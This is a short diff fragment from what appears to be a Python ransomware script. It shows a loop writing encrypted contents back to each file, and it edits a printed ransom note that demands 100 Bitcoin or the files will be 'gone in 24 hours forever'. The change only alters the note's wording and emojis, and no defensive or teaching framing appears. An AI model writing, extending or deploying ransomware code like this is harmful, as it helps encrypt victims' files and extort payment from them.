@@ -26,6 +26,6 @@ for file in files:
         thefile.write(contents_encrypted)
 
 print(
-    "All of your files have been encrypted! Send me 100 Bitcoin "
-    "or they will be gone in 24 hours forever! ☠️"
+    "UH OH! All of your files have been encrypted! Send me 100 Bitcoin "
+    "or they will be gone in 24 hours forever! ☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️"
 )
